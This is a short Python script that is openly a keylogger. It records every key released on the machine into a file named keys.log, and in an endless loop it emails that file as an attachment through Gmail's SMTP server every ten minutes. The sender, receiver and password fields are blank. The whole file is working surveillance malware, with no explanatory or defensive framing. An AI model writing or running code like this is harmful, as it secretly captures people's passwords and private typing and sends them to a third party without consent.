import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard
import time


def send_email():
	port = 587
	smtp_server = "smtp.gmail.com"
	sender_email = ""
	receiver_email = ""
	password = ""
	context = ssl.create_default_context()
	message = MIMEMultipart()
	message["From"] = sender_email
	message["To"] = receiver_email
	message["Subject"] = "Keylogger"
	body = "Keylogger info"
	message.attach(MIMEText(body, "plain"))

	with open("keys.log", "rb") as attachment:
		part = MIMEBase("application", "octet-stream")
		part.set_payload(attachment.read())
	encoders.encode_base64(part)
	part.add_header(
		"Content-Disposition",
		'attachment; filename = "keys.log"'
	)

	message.attach(part)
	text = message.as_string()

	with smtplib.SMTP(smtp_server, port) as server:
		server.starttls(context=context)
		server.login(sender_email, password)
		server.sendmail(sender_email, receiver_email, text)
	time.sleep(600)


def on_release(key):
	if key == keyboard.Key.space:
		key = " "
	elif key == keyboard.Key.enter:
		key = "\n"
	elif key == keyboard.Key.backspace:
		key = "[BACKSPACE]"
	f.write(str(key).replace("'", ""))


listener = keyboard.Listener(on_release=on_release)
listener.start()

while True:
	f = open("keys.log", "a")
	send_email()